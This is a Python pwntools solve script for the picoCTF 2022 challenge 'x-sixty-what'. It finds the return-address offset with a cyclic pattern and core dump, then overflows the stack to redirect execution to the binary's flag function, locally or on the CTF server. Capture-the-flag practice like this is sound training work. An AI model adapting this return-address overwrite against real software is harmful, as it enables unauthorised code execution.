#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the picoCTF 2022 challenge x-sixty-what.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

import re
from pwn import *

exe = ELF('./vuln')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

NUM_CYCLIC_BYTES = 200

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('saturn.picoctf.net', 54041)

    else:
        io = process([exe.path])

    return io


def get_offset():
    '''Return the offset to the flag.
    '''

    # Open the local process.
    conn = process([exe.path])

    # Create a cyclic pattern.
    pattern = cyclic(NUM_CYCLIC_BYTES)

    # Send it to the process, which should cause a fault.
    conn.sendline(pattern)
    conn.wait()

    # Open the coredump.
    core = conn.corefile

    fault = core.fault_addr
    assert p64(fault) in pattern, 'Fault address not found in cyclic pattern.'

    # Get the offset to the flag.
    offset = cyclic_find(p64(fault))
    return offset


def main():
    '''Return the flag.
    '''

    # Get the offset to the return address.
    offset_to_return_address = get_offset()
    log.info(f'The offset to the return address is {offset_to_return_address}.')

    # Get the address of the symbol that opens and prints the flag.
    #flag_function_address = exe.symbols['flag']
    flag_function_address = 0x0040123b
    log.info(f'The address of the flag function is {hex(flag_function_address)}.')

    # Create the payload that overwrites the return address with the flag function address.
    payload = fit({
        offset_to_return_address: p64(flag_function_address)
    })

    # Send the payload.
    with conn() as io:
        io.sendline(payload)
        flag = io.recvregexS(rb'picoCTF\{.*\}')
        flag = re.search(r'picoCTF\{(.*)\}', flag).group(0)

        log.success(f'The flag is: {flag}')
        return flag

if __name__ == '__main__':
    main()
